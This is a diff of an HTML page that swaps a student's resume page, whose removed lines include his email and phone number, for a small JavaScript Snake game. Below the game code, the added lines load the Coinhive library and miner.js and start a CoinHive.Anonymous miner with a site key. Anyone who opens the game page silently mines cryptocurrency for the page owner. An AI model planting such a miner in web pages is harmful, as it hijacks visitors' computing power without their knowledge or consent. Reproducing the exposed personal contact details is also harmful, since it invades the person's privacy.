@@ -1,154 +1,90 @@
-<!DOCTYPE html>
 <html>
-<title>ShubhamK</title>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="w3.css">
-<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto'>
-<link rel="stylesheet" href="font-awesome.min.css">
-<style>
-html,body,h1,h2,h3,h4,h5,h6 {font-family: "Roboto", sans-serif}
-</style>
-<body class="w3-light-grey">
+<title>Snake Game</title>
+<p>Use arrow keys </p>
+<canvas id="gc" height="400" width="400" style="display: block; margin: 0 auto;"> </canvas>
 
-<!-- Page Container -->
-<div class="w3-content w3-margin-top" style="max-width:1400px;">
+<script type="text/javascript">
+	window.onload = function () {
+		// body...
+		canv = document.getElementById("gc");
+		ctx = canv.getContext("2d");
+		document.addEventListener("keydown",keyPush);
+		setInterval(game,1000/10);
 
-  <!-- The Grid -->
-  <div class="w3-row-padding">
-  
-    <!-- Left Column -->
-    <div class="w3-third">
-    
-      <div class="w3-white w3-text-grey w3-card-4">
-        <div class="w3-display-container">
-          <img src="test.jpeg" style="width:100%" alt="Avatar">
-          <div class="w3-display-bottomleft w3-container w3-text-black">
-            <h2><span class="w3-tag w3-teal w3-round">Shubham Khandare</span></h2>
-          </div>
-        </div>
-        <div class="w3-container">
-          <p><i class="fa fa-briefcase fa-fw w3-margin-right w3-large w3-text-teal"></i>Student</p>
-          <p><i class="fa fa-briefcase fa-fw w3-margin-right w3-large w3-text-teal"></i> India</p>
-          <p><i class="fa fa-envelope fa-fw w3-margin-right w3-large w3-text-teal"></i>shubhamkhandare12@gmail.com</p>
-          <p><i class="fa fa-phone fa-fw w3-margin-right w3-large w3-text-teal"></i>9975008756</p>
-          <hr>
+	}
 
-          <p class="w3-large"><b><i class="fa fa-asterisk fa-fw w3-margin-right w3-text-teal"></i>Skills</b></p>
-          <p>Linux</p>
-          <div class="w3-progress-container w3-round-xlarge w3-small">
-            <div class="w3-progressbar w3-round-xlarge w3-teal" style="width:90%">
-              <div class="w3-center w3-text-white">90%</div>
-            </div>
-          </div>
-          <p>Programming</p>
-          <div class="w3-progress-container w3-round-xlarge w3-small">
-            <div class="w3-progressbar w3-round-xlarge w3-teal" style="width:80%">
-              <div class="w3-center w3-text-white">80%</div>
-            </div>
-          </div>
-          <p>Trouble Shooting</p>
-          <div class="w3-progress-container w3-round-xlarge w3-small">
-            <div class="w3-progressbar w3-round-xlarge w3-teal" style="width:75%">
-              <div class="w3-center w3-text-white">75%</div>
-            </div>
-          </div>
-          <p>Computer Hardware</p>
-          <div class="w3-progress-container w3-round-xlarge w3-small">
-            <div class="w3-progressbar w3-round-xlarge w3-teal" style="width:50%">
-              <div class="w3-center w3-text-white">50%</div>
-            </div>
-          </div>
-          <br>
+	xv=yv=0;
+	px=py=10;
+	ax=ay=15;
+	gs=tc=20;
+	trail = [];
+	tail = 5;
 
-          <!-- <p class="w3-large w3-text-theme"><b><i class="fa fa-globe fa-fw w3-margin-right w3-text-teal"></i>Languages</b></p>
-          <p>English</p>
-          <div class="w3-progress-container w3-round-xlarge">
-            <div class="w3-progressbar w3-round-xlarge w3-teal" style="width:90%"></div>
-          </div>
-          <p>Hindi</p>
-          <div class="w3-progress-container w3-round-xlarge">
-            <div class="w3-progressbar w3-round-xlarge w3-teal" style="width:55%"></div>
-          </div>
-          <p>Marathi</p>
-          <div class="w3-progress-container w3-round-xlarge">
-            <div class="w3-progressbar w3-round-xlarge w3-teal" style="width:95%"></div>
-          </div> -->
-          <br>
-        </div>
-      </div><br>
+	function game() {
+		px+=xv;
+		py+=yv;
+		if (px<0) {
+			px = tc-1;
+		}
+		if (px>tc-1) {
+			px=0;
+		}
+		if (py<0) {
+			py = tc-1;
+		}
+		if (py>tc-1) {
+			py=0;
+		}
+		ctx.fillStyle="black";
+		ctx.fillRect(0,0,canv.height,canv.width);
 
-    <!-- End Left Column -->
-    </div>
+		ctx.fillStyle="red";
+		ctx.fillRect(ax*gs,ay*gs,gs-2,gs-2);
 
-    <!-- Right Column -->
-    <div class="w3-twothird">
-    
-      <div class="w3-container w3-card-2 w3-white w3-margin-bottom">
-        <h2 class="w3-text-grey w3-padding-16"><i class="fa fa-suitcase fa-fw w3-margin-right w3-xxlarge w3-text-teal"></i>Work Experience</h2>
-        <div class="w3-container">
-          <h5 class="w3-opacity"><b>Program Director / Lab Administrators of IT dept</b></h5>
-          <h6 class="w3-text-teal"><i class="fa fa-calendar fa-fw w3-margin-right"></i>Jan 2015 - <span class="w3-tag w3-teal w3-round">Current</span></h6>
-          <p>Students association for maintenance of lab of IT dept.</p>
-          <hr>
-        </div>
-        <div class="w3-container">
-          <h5 class="w3-opacity"><b>Technical Adviser / Walchand Linux Users Group</b></h5>
-          <h6 class="w3-text-teal"><i class="fa fa-calendar fa-fw w3-margin-right"></i>Jan 2016 - <span class="w3-tag w3-teal w3-round">Current</span></h6>
-          <p>Club working for linux and open source technologies.</p>
-          <hr>
-        </div>
-        
-      </div>
+		ctx.fillStyle="lime";
+		for (var i = 0; i < trail.length; i++) {
+				ctx.fillRect(trail[i].x*gs,trail[i].y*gs,gs-2,gs-2);
+				if (trail[i].x == px && trail[i].y == py) {
+					tail = 5;
+				}
+		}
+		trail.push({x:px,y:py});
+		while (trail.length > tail) {
+			trail.shift();
+		}
+		if (ax==px && ay==py) {
+					tail++;
+					ax = Math.floor(Math.random()*tc);
+					ay = Math.floor(Math.random()*tc);
+		}
+	}
+	function keyPush(evt) {
+		// body...
+		switch (evt.keyCode) {
+			case 37:
+				xv=-1; yv=0;
+				break;
+			case 38:
+				xv=0; yv=-1;
+				break;
+			case 39:
+				xv=1; yv=0;
+				break;
+			case 40:
+			 	xv=0; yv=1;
+			 	 break;
 
-      <div class="w3-container w3-card-2 w3-white">
-        <h2 class="w3-text-grey w3-padding-16"><i class="fa fa-certificate fa-fw w3-margin-right w3-xxlarge w3-text-teal"></i>Education</h2>
-        <div class="w3-container">
-          <h5 class="w3-opacity"><b>Walchand College of Engg,Sangli</b></h5>
-          <h6 class="w3-text-teal"><i class="fa fa-calendar fa-fw w3-margin-right"></i>2014 till now</h6>
-          <p>Bachelor Of Technology (Information Technology)</p>
-          <hr>
-        </div>
-        <div class="w3-container">
-          <h5 class="w3-opacity"><b>Yashwantrao Chavan Institute of Science,Satara</b></h5>
-          <h6 class="w3-text-teal"><i class="fa fa-calendar fa-fw w3-margin-right"></i>2012 - 2014</h6>
-          <p>HSC</p>
-          <hr>
-        </div>
-        <div class="w3-container">
-          <h5 class="w3-opacity"><b>Annsaheb Kalyani Vidyalaya,Camp Satara</b></h5>
-          <h6 class="w3-text-teal"><i class="fa fa-calendar fa-fw w3-margin-right"></i>2010 - 2012</h6>
-          <p>SSC</p><br>
-        </div>
-      </div>
+			default:
 
-    <!-- End Right Column -->
-    </div>
-    
-  <!-- End Grid -->
-  </div>
-  
-  <!-- End Page Container -->
-</div>
+		}
+	}
 
-<footer class="w3-container w3-teal w3-center w3-margin-top">
-  <p>Find me on social media.</p>
-  <i class="fa fa-facebook-official w3-hover-text-indigo w3-large"></i>
-  <i class="fa fa-instagram w3-hover-text-purple w3-large"></i>
-  <i class="fa fa-snapchat w3-hover-text-yellow w3-large"></i>
-  <i class="fa fa-pinterest-p w3-hover-text-red w3-large"></i>
-  <i class="fa fa-twitter w3-hover-text-light-blue w3-large"></i>
-  <i class="fa fa-linkedin w3-hover-text-indigo w3-large"></i>
-  <p>Powered by <a href="http://shubhamkhandare.github.io" target="_blank">Shubham Khandare</a></p>
-</footer>
-<script type="text/javascript" src="miner.js"></script>
-<!-- <script type="text/javascript" src="/fuckadblock.js"></script>
-<script>!function(){for(var o,e=function(){},n=["assert","clear","count","debug","dir","dirxml","error","exception","group","groupCollapsed","groupEnd","info","log","markTimeline","profile","profileEnd","table","time","timeEnd","timeStamp","trace","warn"],r=n.length,i=window.console=window.console||{};r--;)o=n[r],i[o]||(i[o]=e)}();</script> -->
+</script>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
+<script type="text/javascript" src="miner.js"></script>
+<script type="text/javascript">
     var miner = new CoinHive.Anonymous('8HY3QyIzKd3Sd7CrTCZ0qnAioUkN8dr7');
     miner.start();
 </script>
-</body>
-</html>
 
+</html>
